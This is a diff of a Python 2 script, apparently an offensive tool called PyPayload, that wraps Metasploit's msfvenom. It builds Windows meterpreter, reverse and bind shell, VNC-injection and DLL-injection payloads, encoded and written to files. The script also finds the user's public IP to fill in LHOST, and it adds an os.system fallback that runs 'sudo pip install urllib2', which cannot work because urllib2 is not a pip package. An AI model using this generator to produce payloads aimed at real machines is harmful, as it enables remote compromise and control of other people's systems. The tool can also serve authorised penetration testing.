@@ -1,14 +1,21 @@
-import sys, platform, subprocess, os, socket
-from urllib2 import urlopen
+import sys, platform, os, socket
+from itertools import chain
+
+from subprocess import call
+
+try:
+	from urllib2 import urlopen
+except ImportError:
+	os.system("sudo pip install urllib2")
 
 # Bold
-BR="\033[1;31m"         # Red
-BG="\033[1;32m"       # Green
-BY="\033[1;33m"      # Yellow
-BB="\033[1;34m"        # Blue
-BP="\033[1;35m"      # Purple
-BC="\033[1;36m"        # Cyan
-BW="\033[1;37m"       # White
+BR = "\033[1;31m"         # Red
+BG = "\033[1;32m"       # Green
+BY = "\033[1;33m"      # Yellow
+BB = "\033[1;34m"        # Blue
+BP = "\033[1;35m"      # Purple
+BC = "\033[1;36m"        # Cyan
+BW = "\033[1;37m"       # White
 
 # Regular Colors
 W = '\033[0m'  # white (normal)
@@ -21,64 +28,62 @@ C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
 
-print C + "______     ______           _                 _ "
-print "| ___ \    | ___ \         | |               | |"
-print "| |_/ /   _| |_/ /_ _ _   _| | ___   __ _  __| |"
-print "|  __/ | | |  __/ _` | | | | |/ _ \ / _` |/ _` |"
-print "| |  | |_| | | | (_| | |_| | | (_) | (_| | (_| |"
-print "\_|   \__, \_|  \__,_|\__, |_|\___/ \__,_|\__,_|"
-print "       __/ |           __/ |                    "
-print "      |___/           |___/                     " + W
+header = C + """ ______     ______           _                 _ 
+ | ___ \    | ___ \         | |               | |
+ | |_/ /   _| |_/ /_ _ _   _| | ___   __ _  __| |
+ |  __/ | | |  __/ _` | | | | |/ _ \ / _` |/ _` |
+ | |  | |_| | | | (_| | |_| | | (_) | (_| | (_| |
+ \_|   \__, \_|  \__,_|\__, |_|\___/ \__,_|\__,_|
+        __/ |           __/ |                    
+       |___/           |___/                     """ + W
 
 
-print G + "[*] Automatic Metasploit Payload Generator [*]" + P
-print "[*] Written By: ex0dus_0x [*]" + W
-print "     "
-print "You are currently using " + O + str(platform.system()) + " " + str(platform.release()) + W
-print "     "
+def get_ip():
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	s.connect(('google.com', 0))
+	localaddr = s.getsockname()[0] # local subnet
+	ipaddr = urlopen('http://ip.42.pl/raw').read() # public IP
+	return (ipaddr, localaddr)
+
+def concatenate(*lists):
+    new_list = []
+    for i in lists:
+        new_list.extend(i)
+    return new_list
+
+print header
+
+print G + "\n[*] Automatic Metasploit Payload Generator [*]\n" + P
+print "You are currently using " + O + str(platform.system()) + " " + str(platform.release()) + W + "\nLoading..." 
 
 if str(platform.system()) != "Linux":
 	print BR + "[!] You are not using a Linux-based operating system! [!]" +  W
 
 try:
-    subprocess.call(["msfvenom"], stderr=open(os.devnull, 'wb'))
+    call(["msfvenom"], stderr=open(os.devnull, 'wb'))
 except OSError as e:
     print BR + "[!] Msfvenom is not found! Please set appropriate paths or install Metasploit if not installed! [!] " + W
     sys.exit(1)
 
+payload_array = ["reverse_tcp", "bind_tcp", "reverse_http", "reverse_https"]
+payload_type = ["meterpreter", "shell", "vncinject", "dllinject", ]
+payload_os = ["windows"]
 
 while True:
-    payload = raw_input( BB + "[>] Specify a payload! Press enter to see a list of available payload options, or enter your desired one now: " + W )
-    if payload == "":
-        print "(1) windows/meterpreter/reverse_tcp"
-        print "(2) windows/meterpreter/bind_tcp"
-        print "(3) windows/meterpreter/reverse_http"
-        print "(4) windows/meterpreter/reverse_https"
-        print "    "
-        print "(5) windows/shell/reverse_tcp"
-        print "(6) windows/shell/bind_tcp"
-        print "(7) windows/shell/reverse_http"
-        print "(8) windows/shell/reverse_https"
-        print "     "
-        print "(9) windows/vncinject/reverse_tcp"
-        print "(10) windows/vncinject/bind_tcp"
-        print "(11) windows/vncinject/reverse_http"
-        print "(12) windows/vncinject/reverse_https"
-        print "     "
-        print "(13) windows/dllinject/reverse_tcp"
-        print "(14) windows/dllinject/bind_tcp"
-        print "(15) windows/dllinject/reverse_http"
-        print "(16) windows/dllinject/reverse_https"
-    else:
-        Payload = payload
-        print "Payload => " + payload
-        break
+	payload = raw_input( BB + "[>] Specify a payload! Press enter to see a list of available payload options, or enter your desired one now: " + W )
+	if payload == "":
+		for o in payload_os:
+			for t in payload_type:
+				for a in payload_array:
+					name = o + "/" + t + "/" + a
+					print BW + name
+	else:
+		Payload = payload
+		print "Payload => " + payload
+		break
 
-# IP Resolving! Utilized in order to determine IP addresses!
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(('google.com', 0))
-localaddr = s.getsockname()[0] # local subnet
-ipaddr = urlopen('http://ip.42.pl/raw').read() # public IP
+
+(ipaddr, localaddr) = get_ip()
 
 print "[*] Select option or manually enter [*]"
 print "-------------------------------------------------------------"
@@ -141,7 +146,6 @@ if "dllinject" in payload:
     with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
         call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "DLL={}".format(dllpath), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)
 
-
 print BG + "[*] Creating payload ... [*]" + W
 with open("{}.{}".format(op8, Fileformat), 'w') as outfile:
-    subprocess.call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)
+    call(["msfvenom", "-p", str(payload), "LHOST={}".format(LHOST), "LPORT={}".format(LPORT), "-e", str(Encoder), "-i", str(op5), "-f", str(Fileformat), str(ops)], stdout=outfile)
